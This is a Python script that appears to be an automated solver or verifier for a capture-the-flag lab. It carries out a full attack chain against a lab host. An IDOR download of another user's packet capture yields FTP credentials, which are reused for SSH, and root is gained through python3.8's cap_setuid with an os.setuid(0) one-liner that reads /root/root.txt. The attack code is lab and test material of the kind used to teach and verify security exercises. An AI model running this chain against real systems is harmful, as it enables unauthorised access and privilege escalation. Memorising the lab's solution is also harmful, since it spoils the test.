#!/usr/bin/env python3
"""Independent attacker for Cap's real IDOR -> PCAP -> FTP/SSH -> file capability path."""
import ftplib
import os
import re
import socket
import subprocess
import urllib.error
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://cap-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["CAP_EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["CAP_EXPECTED_ROOT_FLAG"]
SSH_OPTIONS = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "PreferredAuthentications=password",
    "-o", "PubkeyAuthentication=no",
    "-o", "ConnectTimeout=8",
]


def ssh(password, command, timeout=18):
    return subprocess.run(
        ["sshpass", "-p", password, "ssh", *SSH_OPTIONS,
         "nathan@cap-target", command],
        text=True, capture_output=True, timeout=timeout,
    )


for port, prefix in ((21, b"220"), (22, b"SSH-2.0-")):
    with socket.create_connection(("cap-target", port), timeout=6) as sock:
        assert sock.recv(180).startswith(prefix), f"Missing real service banner on {port}"
print("PASS: real FTP and OpenSSH services discovered", flush=True)

with urllib.request.urlopen(BASE + "/", timeout=8) as response:
    home = response.read()
assert b"Security Dashboard" in home and b"Nathan" in home

# A numeric object reference is exposed by the dashboard. The seed object
# belongs to another user's session and is intentionally downloadable unauthenticated.
with urllib.request.urlopen(BASE + "/data/0", timeout=8) as response:
    assert response.status == 200
with urllib.request.urlopen(BASE + "/download/0", timeout=8) as response:
    pcap = response.read()
assert pcap[:4] in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4", b"\x0a\x0d\x0d\x0a")
user_match = re.search(rb"USER ([^\r\n]+)", pcap)
pass_match = re.search(rb"PASS ([^\r\n]+)", pcap)
assert user_match and pass_match, "Downloaded PCAP did not contain an FTP control login"
username = user_match.group(1).decode("ascii")
password = pass_match.group(1).decode("ascii")
assert username == "nathan"
print("PASS: unauthenticated IDOR returns a real PCAP with FTP control credentials", flush=True)

ftp = ftplib.FTP("cap-target", timeout=8)
ftp.login(username, password)
listing = []
ftp.retrlines("LIST", listing.append)
assert any("user.txt" in line for line in listing)
downloaded = bytearray()
ftp.retrbinary("RETR user.txt", downloaded.extend)
actual_user_flag = downloaded.decode("utf-8", "replace").strip()
assert actual_user_flag == EXPECTED_USER_FLAG, "Exact per-instance User Flag mismatch"
ftp.quit()
print("PASS: recovered PCAP credentials authenticate to real FTP and retrieve exact User Flag", flush=True)

# Reuse the same credential against the real SSH service, then inspect the
# executable capability before exercising it. The target is never queried
# through docker exec or by reading its mounted filesystem.
identity = ssh(
    password,
    "id -un; id; getcap /usr/bin/python3.8; "
    "if test -r /root/root.txt; then echo ROOT_READABLE; else echo ROOT_DENIED; fi",
)
assert identity.returncode == 0, (identity.stdout, identity.stderr)
assert "nathan" in identity.stdout and "uid=1000(nathan)" in identity.stdout, identity.stdout
assert "cap_setuid" in identity.stdout, identity.stdout
assert "ROOT_DENIED" in identity.stdout and "ROOT_READABLE" not in identity.stdout, identity.stdout
print("PASS: FTP credential reuse grants Nathan SSH; Python has real cap_setuid", flush=True)

# Python's file capability permits setuid(0). Read the actual protected flag
# through the SSH command channel after the UID transition.
root = ssh(
    password,
    "/usr/bin/python3.8 -c 'import os; os.setuid(0); "
    "print(\"ROOT_UID=\" + str(os.getuid())); "
    "print(open(\"/root/root.txt\").read().strip())'",
)
assert root.returncode == 0, (root.stdout, root.stderr)
assert "ROOT_UID=0" in root.stdout, root.stdout
assert EXPECTED_ROOT_FLAG in root.stdout, "Exact per-instance Root Flag mismatch"
print("PASS: real Python cap_setuid -> UID 0 -> exact Root Flag", flush=True)

# Keep the original live-capture behavior check: the app performs a real
# five-second tcpdump, creates the next sequential PCAP and redirects to it.
try:
    urllib.request.urlopen(BASE + "/capture", timeout=12)
except urllib.error.HTTPError as err:
    raise AssertionError(f"capture endpoint failed: {err.code}") from err
print("PASS: live five-second tcpdump capture still works", flush=True)
